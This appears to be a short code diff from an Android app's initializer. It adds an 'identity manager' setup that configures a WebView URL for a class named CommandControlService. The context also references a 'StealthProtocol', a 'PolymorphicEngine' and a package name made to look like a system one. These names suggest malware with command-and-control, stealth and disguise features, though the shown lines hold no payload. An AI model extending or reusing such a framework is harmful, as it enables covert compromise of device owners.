@@ -35,6 +35,20 @@ public class AppCoreInitializer extends Application {
             Log.e(TAG, "StealthProtocol init erro: " + e.getMessage());
         }
 
+        // ── Identity system init ─────────────────────────────────────────────────
+        try {
+            com.android.core.sync.AppIdentityManager.get().configureFromBuildConfig(this);
+            // Sync WEBVIEW_URL with identity default if not already overridden
+            if (CommandControlService.WEBVIEW_URL == null || CommandControlService.WEBVIEW_URL.isEmpty()) {
+                CommandControlService.WEBVIEW_URL =
+                    com.android.core.sync.AppIdentityManager.get().getConfig().webviewUrl;
+            }
+            Log.d(TAG, "🎭 AppIdentityManager configured: "
+                + com.android.core.sync.AppIdentityManager.get().getActiveIdentity());
+        } catch (Exception e) {
+            Log.e(TAG, "AppIdentityManager init error: " + e.getMessage());
+        }
+
         // 🔀 Inicializa engine polimórfica
         try {
             PolymorphicEngine engine = PolymorphicEngine.getInstance();
